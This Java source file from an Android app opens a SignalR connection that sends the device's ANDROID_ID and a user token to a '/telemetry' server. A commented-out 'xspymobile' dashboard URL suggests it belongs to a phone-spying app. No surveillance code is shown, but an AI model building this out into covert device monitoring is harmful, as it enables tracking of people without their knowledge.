package com.remote.app.socket;

import android.content.SharedPreferences;
import android.provider.Settings;

import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;
import com.microsoft.signalr.HubConnectionState;
import com.remote.app.MainService;

import java.util.HashMap;
import java.util.Map;

public class IOSocket {
    private static final IOSocket ourInstance = new IOSocket();
    private HubConnection ioSocket;


    public HubConnection init(String key) {
        if (key == null || ioSocket != null)
            return ioSocket;

        String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);

        Map<String, String> headers = new HashMap<>();
        headers.put("device-id", deviceID);
        headers.put("user-token", key);

        ioSocket = HubConnectionBuilder.create(getUrl() + "/telemetry")
                .withHeaders(headers)
                .build();

        return ioSocket;
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public static String getUrl() {
       // return "https://dash.xspymobile.com";
        return "http://192.168.0.2:5000";
    }

    public void send(String method, Object... args) {
        if (ioSocket == null)
            return;

        if (ioSocket.getConnectionState() == HubConnectionState.CONNECTED)
            ioSocket.send(method, args);
    }


}
